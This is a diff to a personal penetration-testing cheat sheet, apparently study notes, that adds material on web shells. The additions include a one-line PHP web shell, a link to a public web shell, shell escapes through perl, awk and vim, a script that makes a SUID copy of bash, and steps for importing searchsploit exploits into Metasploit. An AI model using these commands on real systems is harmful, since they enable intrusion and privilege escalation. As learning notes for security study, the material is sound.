@@ -2046,15 +2046,21 @@ We can use `netcat` to connect to that port and get a connection to the shell. U
 
 ## Web Shell
 
-### Writing a Web Shell
-
 A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
+
+`/usr/share/laudanum` includes injectable files for many different web application languages.
+
+You may run into some implementations that randomize filenames on upload.
+
+### Writing a Web Shell
 
 **Code: php**
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
+
+ [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
 
 **Code: jsp**
 
@@ -2080,6 +2086,8 @@ Now we have to write one of the web shells above in the web root
 | `XAMPP`    | C:\xampp\htdocs\       |
 
 We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 
+
+#### Bypassing File Type restrictions
 
 
 
@@ -2126,11 +2134,37 @@ Staged payloads could lead to unstable shell sessions in these environments, so 
 
 - **Bash**
 
+  ```bash
+  /bin/sh -i
+  ```
+
   Copies bash, give SUID priviliges,
 
   ```bash
   echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
   ```
+
+  - Perl:
+
+    ```bash
+    perl —e 'exec "/bin/sh";'
+    ```
+
+  - Same for ruby or lua
+
+  - AWK
+
+    ```bash
+    awk 'BEGIN {system("/bin/sh")}'
+    ```
+
+  - Vim
+
+    ```bash
+    vim -c ':!/bin/sh'
+    ```
+
+    
 
 - **MSFvenom**
 
@@ -2995,11 +3029,34 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
 
 The same procedure holds for the other languages.
 
-## Others
 
-2. 
 
 # General Knowledge
+
+## Metasploit
+
+In `msfconsole`:
+
+```bash
+search [exploit]
+use [exploit]
+options
+exploit
+```
+
+To import an exploit from `searchsploit`:
+
+```bash
+searchsploit [exploit]	#get exploit path
+cd ~/.msf4/modules/exploits
+mkdir [exploit path]	# create the full exploit path inside msf
+cd [exploit path]
+searchsploit -m [exploit_number]	# copies the exploit
+msfconsole
+	>use [exploit path]
+```
+
+
 
 ## Google search
 
